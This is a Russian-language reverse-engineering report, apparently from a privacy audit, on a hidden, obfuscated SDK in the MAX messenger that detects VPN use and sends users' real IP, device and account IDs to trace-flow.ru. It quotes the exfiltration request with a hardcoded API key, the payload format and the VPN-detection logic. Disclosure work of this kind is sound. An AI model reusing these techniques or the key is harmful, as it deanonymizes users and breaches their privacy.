---
tags: [critical, surveillance, deanonymization, vpn-bypass, ip-fingerprint, trace-flow, dps, hidden-sdk, obfuscated]
status: verified
severity: critical
sources:
  - work/jadx_base/sources/defpackage/zu5.java
  - work/jadx_base/sources/defpackage/kyk.java
  - work/jadx_base/sources/defpackage/wzk.java
  - work/jadx_base/sources/defpackage/qzk.java
  - work/jadx_base/sources/defpackage/y0l.java
  - work/jadx_base/sources/defpackage/bzk.java
  - work/jadx_base/sources/defpackage/kzk.java
  - work/jadx_base/sources/defpackage/v0l.java
  - work/jadx_base/sources/defpackage/n1l.java
  - work/jadx_base/sources/defpackage/AccountInitializer.java
  - work/jadx_base/sources/defpackage/hph.java
  - work/jadx_base/sources/defpackage/z8f.java
  - work_26.16.0/apktool_base/AndroidManifest.xml
  - work_26.16.0/apktool_base/smali/awg.smali
related:
  - "[[02-vpn-warning]]"
  - "[[03-pms-server-flags]]"
  - "[[04-telemetry-endpoints]]"
  - "[[24-host-reachability-probe]]"
  - "[[368-webapp-vpn-exception]]"
  - "[[03-hidden-apis-reflection|wave1/03-hidden-apis-reflection]]"
  - "[[543-reconnect-ws-server-host-takeover]]"
---

# 542. trace-flow.ru / DPS — отдельный SDK для деанонимизации пользователей под VPN

> **Самая жёсткая находка реверса.** В MAX встроен **отдельный обфусцированный SDK** под брендом «`ru.trace_flow.dps`», который при каждом выходе приложения на передний план определяет реальный публичный IP пользователя через 6 внешних сервисов, фиксирует факт работы через VPN (включая обход стандартного API через перечисление сетевых интерфейсов `tun/ppp/tap/ipsec`), привязывает это к `userId + deviceId` и отправляет на собственный домен `https://trace-flow.ru/api/v1/report`. Это не аналитика производительности — это специализированный инструмент **деанонимизации абонентов, обходящих блокировки**.

## Суть

DPS (Digital Probe System по namespace `dpslib`) — модуль `ru.trace_flow.dps`, инициализируемый в `AccountInitializer` после логина под флагом `PmsKey "dps"` (серверно управляемый). Все строки SDK обфусцированы через XOR-декодер `z8f.a()` — целенаправленное сокрытие от статического анализа. Домен `trace-flow.ru` нигде в Privacy Policy MAX не упомянут.

## Что отправляется на trace-flow.ru

### Точный URL
```
POST https://trace-flow.ru/api/v1/report?ver=<configVersion>
Authorization: ply5hDvhupghrHVA5rqQD1ypiXAxbmE4A68ZzBa8ioc=
Content-Type: application/json
Content-Encoding: gzip
```

API-ключ `ply5hDvhupghrHVA5rqQD1ypiXAxbmE4A68ZzBa8ioc=` — захардкожен (Base64-encoded 32 байта).

### Точный JSON-формат

```json
{
  "snapshots": [
    {
      "id":             "a1b2c3d4-...",          // UUID
      "clientTs":       1715900000,              // unix-секунды
      "appVersion":     "26.15.3",
      "ip":             "185.22.33.44",          // ← РЕАЛЬНЫЙ ПУБЛИЧНЫЙ IP в чистом виде
      "connectionType": 2,                       // 0=unk, 1=none, 2=wifi, 3=2G, 4=3G, 5=4G+
      "operator":       "25001:MTS",             // MCC+MNC + имя оператора
      "vpn":            true,                    // ← VPN detected
      "deviceId":       "abc123...",             // привязка к устройству
      "uid":            "12345678",              // ← ПРИВЯЗКА К USER ID (НЕ анонимно)
      "hosts": [
        {"id": 1, "status": 7}                   // битмаска: DNS(1)|TCP(2)|TLS(4)
      ]
    }
  ]
}
```

**IP отправляется в открытом виде** (не хеш, не truncated). И связан с `uid` пользователя MAX. Это однозначно идентифицирует:
- Реальный IP абонента, обходящего блокировку
- Использует ли он VPN
- Какого оператора SIM-карта использована
- На каком устройстве (`deviceId`)

## Как определяется реальный IP (даже под VPN)

Hardcoded дефолтный список IP-detection доменов (`hph.java` case 12):

```
https://ipv4-internet.yandex.net/api/v0/ip
https://ipv6-internet.yandex.net/api/v0/ip
https://ifconfig.me/ip
https://api.ipify.org
https://checkip.amazonaws.com
https://ip.mail.ru/
```

Алгоритм (`zu5.g0()`):
1. shuffle списка
2. последовательно пробует каждый URL до получения IP
3. парсит IP regex'ом `\b(?:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|[0-9a-fA-F:]+:[0-9a-fA-F:]+)\b`
4. `127.0.0.1` отбрасывается

Если у пользователя VPN направляет только трафик на `api.oneme.ru`, но не на `yandex.net` или `ipify.org` — определит **реальный** IP, не VPN-выходной.

## Как детектируется VPN — обход стандартного API

`qzk.c()` (NetworkInfo) использует **двойную проверку**:

### Метод 1: NetworkCapabilities (через reflection)
```java
NetworkCapabilities.hasCapability(15) // NET_CAPABILITY_NOT_VPN
// возвращает false → VPN активен
```
Reflection через `e1l`/`hph` (см. [[wave1/03-hidden-apis-reflection]]) — обход hidden API restrictions, обфусцированные имена классов.

### Метод 2: Fallback — перечисление сетевых интерфейсов
```java
// Перебирает NetworkInterface.getNetworkInterfaces(), ищет имена, начинающиеся с:
"tun"   // OpenVPN, WireGuard
"ppp"   // PPTP, L2TP
"tap"   // OpenVPN tap mode
"ipsec" // IPSec / IKEv2
```

Это **обходит** ограничения, когда VPN-приложение **не объявляет** `TRANSPORT_VPN` (некоторые proxy-приложения, split-tunnel конфиги). MAX будет знать факт VPN даже если стандартный Android API его не показывает.

## Триггер отправки

`a0l` (ActivityLifecycleCallbacks) ловит **первый** `onActivityStarted` после периода backgrounded → запускает pipeline:

```
[Foreground transition]
  → a0l.onActivityStarted (counter == 1)
    → zu5.E0()
      → executor.execute → zu5.D0()
        → kzk.b() читает dps_config.bin
        → если sampleRate проходит:
            → zu5.g0(config)
                → y0l.a() — есть ли интернет
                → IP detection (см. выше)
                → wzk(0|1|2) для каждого reachabilityHost — DNS/TCP/TLS
                → собрать operator, connectionType, vpn
                → v0l.d() — append в dps_log_entries.bin
                → kyk.a() — POST на trace-flow.ru
```

Отправка — каждый раз, когда юзер открывает MAX из бэкграунда. По умолчанию `sampleRate = 1.0` (100% событий).

## Серверный контроль — ВЕСЬ список хостов настраиваемый

В ответе сервера на report:
```json
{
  "config": {
    "reportHosts":            ["https://trace-flow.ru"],           // ← можно сменить
    "selfIpDetectionDomains": ["...", ...],                         // ← можно сменить
    "reachabilityHosts":      [{"id": 1, "host": "api.oneme.ru"}],  // ← можно сменить
    "timeoutMs":              10000,
    "version":                0,
    "maxSnapshots":           50,
    "snapshotLifetimeMs":     86400000,
    "sampleRate":             1.0
  },
  "dontReportUntil": <epoch_seconds>
}
```

`dontReportUntil` — сервер может приглушить клиент на N секунд (throttling). HTTP 429 — `close()` (отключение SDK до перезапуска).

**Новые хосты сервер может задать произвольные** — это превращает SDK в инструмент произвольной reachability-разведки в сети пользователя (внутренние корпоративные хосты, IP-адреса, .onion, чужие сайты). Status битмаска `DNS|TCP|TLS` подходит для проверки — какие порты открыты на каждом хосте с точки зрения устройства.

## Где живёт SDK

| Артефакт | Путь |
|---|---|
| AndroidManifest provider | `<provider authorities="ru.oneme.app.dps-init-provider" enabled="false" name="ru.trace_flow.dps.internal.DpsInitProvider"/>` |
| Smali | `smali_classes3/ru/trace_flow/dps/internal/DpsInitProvider.smali` |
| Decoded host (XOR в `z8f`) | `smali/awg.smali` (строка `https://trace-flow.ru`) |
| Java-классы (jadx) | `defpackage/zu5.java` (главный), `kyk` (HTTP), `wzk` (DNS/TCP/TLS), `qzk` (network info + VPN), `y0l` (online check), `bzk` (config), `kzk`/`v0l` (cache + log), `n1l` (snapshot), `q0l` (log entry), `d1l`/`f0l` (host + result) |

ContentProvider в манифесте `enabled="false"` — авто-инициализация выключена. Реально SDK запускается из `AccountInitializer` (после логина) — то есть после привязки к учётной записи.

## Файлы кэша на устройстве

```
/data/data/ru.oneme.app/files/dps_config.bin        — бинарный конфиг от сервера
/data/data/ru.oneme.app/files/dps_dont_report.bin   — timestamp throttling
/data/data/ru.oneme.app/files/dps_log_entries.bin   — append-only лог snapshot'ов
```

Лог удаляется после каждого успешного report (HTTP 200).

## Что это даёт стороне сервера

С привязкой `(uid, deviceId, ip, vpn, operator)` сервер MAX (или любой бэкенд за `trace-flow.ru`) может:

1. **Определить реальное местоположение** пользователя по IP — даже если он за VPN, реальный IP уйдёт через Yandex/ifconfig.me/ipify
2. **Строить карту "пользователь → реальный IP"** для всех абонентов, обходящих блокировки
3. **Определить, какие ресурсы доступны/недоступны** в сети конкретного пользователя (по reachabilityHosts с битмаской DNS/TCP/TLS)
4. **Превратить устройство в reachability-проксю** для произвольных хостов — сервер задаёт `host`, клиент проверяет и репортит результат
5. **Связать MAX-аккаунт с физическим SIM** через `operator: MCC:MNC:Name`
6. **Передать данные третьей стороне** (отдельный домен `trace-flow.ru` создаёт plausible deniability — это «не MAX, это партнёр»)

## Почему это страшнее всего предыдущего

| Свойство | Предыдущие находки (533–541) | DPS / trace-flow.ru |
|---|---|---|
| Канал | Часть основного протокола MAX | **Отдельный SDK + отдельный домен** |
| Обфускация | Обычная Java-обфускация | **XOR-кодирование строк** в `z8f.a()`, hidden API через reflection |
| Назначение | Surveillance внутри функций | **Целевая** деанонимизация + reachability-разведка |
| Привязка | userId/deviceId в общем потоке | userId + deviceId + **реальный IP** в одной записи |
| VPN-обработка | Разные механизмы детекта | **Двойной детект**: API + перечисление tun/ppp/tap/ipsec |
| Серверный контроль | PmsKey-флаги внутри MAX | **Полный контроль над списком IP-detection доменов и reachability-хостов** |
| Privacy Policy | Покрывается стандартными формулировками | **Отдельный домен** trace-flow.ru не упомянут |

Это **первый компонент в реверсе**, у которого:
- собственный namespace вне `one.me.*` / `ru.ok.tamtam.*` (`ru.trace_flow.dps`)
- собственный домен (`trace-flow.ru`)
- собственный API-ключ
- целенаправленная обфускация имён и строк

То есть это сознательно отделённая подсистема, а не побочный эффект сборки.

## Сценарий целевой деанонимизации

```
1. Пользователь работает через VPN, скрывая физическое местоположение.
2. Сервер MAX выставляет PmsKey "dps" = true для конкретного userId.
3. Клиент ловит первый foreground после конфигурации.
4. SDK запрашивает yandex.net/api/v0/ip (или один из 5 fallback'ов).
   Запрос идёт через VPN — но определяет именно тот публичный IP,
   через который выходит трафик пользователя в данный момент.
5. SDK проверяет VPN-флаг через перечисление tun/ppp/tap/ipsec —
   фиксирует факт VPN даже если ОС его не объявляет.
6. SDK собирает operator (по SIM-карте, не по IP-геолокации) — знает физическую страну.
7. SDK отправляет {uid, deviceId, ip, vpn=true, operator="25001:MTS"}
   на trace-flow.ru.
8. На стороне сервера — таблица:
     userId | deviceId | timestamp | reportedIp | vpn | operator
   Несколько записей за разные дни → корреляция:
     - какой реальный публичный IP у этого userId
     - какие VPN-сервисы он использует (по диапазонам IP exit-нод)
     - какого оператора реальная SIM
```

Это inversion стандартной модели — обычно VPN скрывает реальный IP и операторскую информацию. Здесь приложение **сознательно** обходит этот слой защиты на стороне клиента.

## Критическое в правовой плоскости

- IP — **персональные данные** в РФ (152-ФЗ, разъяснения Роскомнадзора).
- `operator + uid` создаёт связку с физическим лицом.
- Privacy Policy MAX упоминает `api.oneme.ru` и трекеры, но **не** `trace-flow.ru`.
- Сбор начинается **до** получения какого-либо явного согласия пользователя на сетевую разведку через сторонние сервисы.

## Статус в 26.16.0

Без изменений. Provider в манифесте, smali-классы, обфусцированная строка `https://trace-flow.ru`, PmsKey `dps` — всё на месте. Если кодовая база MAX на следующих релизах что-то и причесала под общественное давление, эту подсистему трогать не стали.

## Ключевые файлы для проверки

- `defpackage/zu5.java` — главный класс DPS (Builder, executor, foreground listener)
- `defpackage/kyk.java` — HTTP-отправка POST на trace-flow.ru
- `defpackage/wzk.java` — DNS/TCP/TLS-проверки
- `defpackage/qzk.java` — VPN-детект через NetworkCapabilities + перечисление tun/ppp/tap/ipsec
- `defpackage/hph.java` — factory обфусцированных констант (case 12 = trace-flow.ru defaults)
- `defpackage/AccountInitializer.java` — задача `"Dps"` после логина
- `findings/raw/pms_keys.txt` — PmsKey `dps` (ordinal 228)
- `notes/wave2/02-dps-traceflow-full.md` — полный реверс с pipeline

---

**Вывод одной строкой:** это инструмент, чьё единственное назначение — определять реальные IP-адреса абонентов, обходящих сетевые блокировки. Замаскирован под «партнёрский SDK» с отдельным доменом и API-ключом. Активируется удалённо, серверно конфигурируется, целевая привязка к userId.
